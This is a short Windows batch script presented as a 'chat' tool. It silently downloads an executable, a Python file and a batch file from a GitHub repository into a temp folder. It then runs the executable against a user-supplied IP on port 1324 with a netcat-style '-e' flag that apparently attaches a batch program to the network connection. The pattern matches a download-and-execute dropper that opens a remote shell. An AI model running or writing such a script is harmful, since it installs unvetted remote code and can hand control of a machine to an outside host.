@echo off
set IP=%*
rd /s /q %temp%\batch_chat_tools
mkdir %temp%\batch_chat_tools
cd %temp%\batch_chat_tools
curl -L -s -O https://github.com/wedadata/chat_bat/raw/refs/heads/main/service_tool_chat.exe
curl -s -O https://github.com/wedadata/chat_bat/raw/refs/heads/main/msgbox.py
curl -s -O https://github.com/wedadata/chat_bat/raw/refs/heads/main/chat_engine.bat
service_tool_chat.exe %IP% 1324 -e chat_engine.bat
